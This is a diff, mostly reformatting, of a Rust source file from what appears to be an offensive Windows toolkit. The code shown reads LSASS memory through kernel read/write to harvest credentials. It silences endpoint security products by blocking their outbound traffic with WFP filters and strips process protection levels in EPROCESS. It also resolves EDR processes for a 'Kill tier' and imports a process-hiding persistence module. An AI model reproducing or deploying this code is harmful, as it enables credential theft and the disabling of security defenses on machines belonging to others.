@@ -32,8 +32,6 @@ use crate::pagewalk::PhysRead;
 use crate::persistence::ProcessHider;
 use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
 use alloc::format;
-#[cfg(any(target_os = "windows", test))]
-use alloc::string::String;
 use alloc::vec::Vec;
 
 // ---- KernelRw address-space contract (kernelsdk-2-1) -----------------------
@@ -228,9 +226,12 @@ impl Drop for WfpSilenceGuard {
         // path: one call, all filters gone, no residue.
         if !self.engine_handle.is_null() {
             type FwpmEngineClose0 = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
-            if let Ok(close) =
-                unsafe { crate::win::resolve::resolve_sym::<FwpmEngineClose0>(b"fwpuclnt.dll", b"FwpmEngineClose0") }
-            {
+            if let Ok(close) = unsafe {
+                crate::win::resolve::resolve_sym::<FwpmEngineClose0>(
+                    b"fwpuclnt.dll",
+                    b"FwpmEngineClose0",
+                )
+            } {
                 let _ = unsafe { close(self.engine_handle) };
             }
             // Null regardless of close success: the handle is dead either way
@@ -266,9 +267,12 @@ impl WfpSilenceGuard {
     /// After this the guard is inert (further drops are no-ops).
     pub fn close(mut self) -> u32 {
         type FwpmEngineClose0 = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
-        let st = if let Ok(close) =
-            unsafe { crate::win::resolve::resolve_sym::<FwpmEngineClose0>(b"fwpuclnt.dll", b"FwpmEngineClose0") }
-        {
+        let st = if let Ok(close) = unsafe {
+            crate::win::resolve::resolve_sym::<FwpmEngineClose0>(
+                b"fwpuclnt.dll",
+                b"FwpmEngineClose0",
+            )
+        } {
             unsafe { close(self.engine_handle) }
         } else {
             0xFFFFFFFF // sentinel for "couldn't resolve FwpmEngineClose0"
@@ -362,7 +366,14 @@ fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, K
         let prepared = PreparedFilter::block_outbound_for_pid(rule.pid)?;
         let filter = prepared.filter();
         let mut filter_id: u64 = 0;
-        let st = unsafe { add(guard.engine_handle, &filter, core::ptr::null(), &mut filter_id) };
+        let st = unsafe {
+            add(
+                guard.engine_handle,
+                &filter,
+                core::ptr::null(),
+                &mut filter_id,
+            )
+        };
         if st != 0 {
             // `guard` is dropped here → session closes → partial filters removed.
             return Err(KitError::Other(format!(
@@ -493,23 +504,23 @@ fn ale_app_id_condition(app_id: *mut FwpByteBlob) -> FwpmFilterCondition0 {
 #[cfg(any(target_os = "windows", test))]
 #[repr(C)]
 struct FwpmFilter0 {
-    filter_key: Guid,                          // 0: zero = auto-generate
-    display_name: *const u16,                  // 16: FWPM_DISPLAY_DATA0.name (null)
-    display_desc: *const u16,                  // 24: FWPM_DISPLAY_DATA0.description (null)
-    flags: u32,                                // 32: FWPM_FILTER_FLAG_NONE = 0 (never PERSISTENT)
-    provider_key: *const Guid,                 // 40: null
-    provider_data: FwpByteBlob,                // 48: empty
-    layer_key: Guid,                           // 64: FWPM_LAYER_ALE_AUTH_CONNECT_V4
-    sublayer_key: Guid,                        // 80: zero = default sublayer
-    weight_type: u32,                          // 96: FWP_VALUE0.type = FWP_EMPTY (0) → auto weight
-    weight_value: u64,                         // 104: FWP_VALUE0 union (unused)
-    num_filter_conditions: u32,                // 112: ALWAYS 1 — see P0-9 below
+    filter_key: Guid,                               // 0: zero = auto-generate
+    display_name: *const u16,                       // 16: FWPM_DISPLAY_DATA0.name (null)
+    display_desc: *const u16,                       // 24: FWPM_DISPLAY_DATA0.description (null)
+    flags: u32,                 // 32: FWPM_FILTER_FLAG_NONE = 0 (never PERSISTENT)
+    provider_key: *const Guid,  // 40: null
+    provider_data: FwpByteBlob, // 48: empty
+    layer_key: Guid,            // 64: FWPM_LAYER_ALE_AUTH_CONNECT_V4
+    sublayer_key: Guid,         // 80: zero = default sublayer
+    weight_type: u32,           // 96: FWP_VALUE0.type = FWP_EMPTY (0) → auto weight
+    weight_value: u64,          // 104: FWP_VALUE0 union (unused)
+    num_filter_conditions: u32, // 112: ALWAYS 1 — see P0-9 below
     filter_conditions: *const FwpmFilterCondition0, // 120
-    action_type: u32,                          // 128: FWPM_ACTION0.type = FWP_ACTION_BLOCK
-    action_guid: Guid,                         // 132: FWPM_ACTION0 union (unused for block)
-    raw_context: [u64; 2], // 152: { UINT64 rawContext; GUID providerContext } union (16 bytes)
-    reserved: *const Guid, // 168: SDK reserved pointer — always null
-    filter_id: u64,        // 176: OUT (0 on input)
+    action_type: u32,           // 128: FWPM_ACTION0.type = FWP_ACTION_BLOCK
+    action_guid: Guid,          // 132: FWPM_ACTION0 union (unused for block)
+    raw_context: [u64; 2],      // 152: { UINT64 rawContext; GUID providerContext } union (16 bytes)
+    reserved: *const Guid,      // 168: SDK reserved pointer — always null
+    filter_id: u64,             // 176: OUT (0 on input)
     effective_weight_type: u32, // 184: FWP_VALUE0 (OUT)
     effective_weight_value: u64, // 192: FWP_VALUE0 union (OUT)
 }
@@ -579,10 +590,9 @@ fn resolve_image_path_wide(pid: u32) -> Result<Vec<u16>, KitError> {
     let open_process: OpenProcessFn =
         unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
             .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;
-    let query_name: QueryFullProcessImageNameWFn = unsafe {
-        crate::win::resolve::resolve_sym(b"kernel32.dll", b"QueryFullProcessImageNameW")
-    }
-    .map_err(|_| KitError::Other("QueryFullProcessImageNameW unresolved".into()))?;
+    let query_name: QueryFullProcessImageNameWFn =
+        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"QueryFullProcessImageNameW") }
+            .map_err(|_| KitError::Other("QueryFullProcessImageNameW unresolved".into()))?;
     let close_handle: CloseHandleFn =
         unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
             .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;
@@ -967,15 +977,11 @@ impl CredKit for KernelLsassReader {
                 )
             })?;
         let read_size: usize = 0x10_0000; // 1 MiB initial read
-        // Skip non-present pages (kernelsdk-2-2): the 1 MiB window at the
-        // image base is sparse — gaps between sections and beyond the last
-        // section are unmapped. Zero-fill those instead of aborting the dump.
-        let bytes = Self::read_process_mem_skip_unmapped(
-            krw,
-            eprocess_kva,
-            user_mode_base,
-            read_size,
-        )?;
+                                          // Skip non-present pages (kernelsdk-2-2): the 1 MiB window at the
+                                          // image base is sparse — gaps between sections and beyond the last
+                                          // section are unmapped. Zero-fill those instead of aborting the dump.
+        let bytes =
+            Self::read_process_mem_skip_unmapped(krw, eprocess_kva, user_mode_base, read_size)?;
         Ok((bytes, user_mode_base as u64))
     }
 }
@@ -1025,9 +1031,10 @@ impl ProtectionSnapshot {
                 "non-canonical EPROCESS KVA — refusing to strip protection on a corrupt address",
             ));
         }
-        let mut rd = |off: usize| -> Result<u8, KitError> {
+        let rd = |off: usize| -> Result<u8, KitError> {
             let mut b = [0u8; 1];
-            krw.kread(eprocess_kva + off, &mut b).map_err(KitError::from)?;
+            krw.kread(eprocess_kva + off, &mut b)
+                .map_err(KitError::from)?;
             Ok(b[0])
         };
         let snap = ProtectionSnapshot {
@@ -1054,8 +1061,11 @@ impl ProtectionSnapshot {
     ) -> Result<(), KitError> {
         krw.kwrite(eprocess_kva + offsets.protection, &[self.protection])
             .map_err(KitError::from)?;
-        krw.kwrite(eprocess_kva + offsets.signature_level, &[self.signature_level])
-            .map_err(KitError::from)?;
+        krw.kwrite(
+            eprocess_kva + offsets.signature_level,
+            &[self.signature_level],
+        )
+        .map_err(KitError::from)?;
         krw.kwrite(
             eprocess_kva + offsets.section_signature_level,
             &[self.section_signature_level],
@@ -1123,11 +1133,7 @@ impl EdrNeutralizer {
     /// R/W). This is the resolution half of the Kill tier, kept public for
     /// operators whose driver exposes a native terminate IOCTL
     /// (`ObOpenObjectByPointer` + `ZwTerminateProcess`) and only need the KVA.
-    pub fn resolve_target_eprocess(
-        &self,
-        krw: &dyn KernelRw,
-        pid: u32,
-    ) -> Result<usize, KitError> {
+    pub fn resolve_target_eprocess(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
         if self.ps_active_process_head_kva == 0 {
             return Err(KitError::UnsupportedPosture(
                 "PsActiveProcessHead KVA unresolved for Kill tier — \
@@ -1625,7 +1631,10 @@ mod tests {
         assert_eq!(cond.field_key, CONDITION_ALE_APP_ID);
         assert_eq!(cond.match_type, FWP_MATCH_EQUAL);
         assert_eq!(cond.condition_value.value_type, FWP_BYTE_BLOB_TYPE);
-        assert_eq!(cond.condition_value.byte_blob, &mut blob as *mut FwpByteBlob);
+        assert_eq!(
+            cond.condition_value.byte_blob,
+            &mut blob as *mut FwpByteBlob
+        );
     }
 
     #[test]
@@ -1859,7 +1868,7 @@ mod tests {
         assert!(is_plausible_phys_address(0));
         assert!(is_plausible_phys_address(0x10000));
         assert!(is_plausible_phys_address(0x7FFF_FFFF_FFFF)); // 2^47 - 1, max plausible
-        // Virtual addresses (kernel + user) set bit 47 → rejected.
+                                                              // Virtual addresses (kernel + user) set bit 47 → rejected.
         assert!(!is_plausible_phys_address(1 << 47));
         assert!(!is_plausible_phys_address(0x0000_8000_0000_0000)); // first user VA
         assert!(!is_plausible_phys_address(0xFFFF_8000_0000_0000)); // first kernel VA
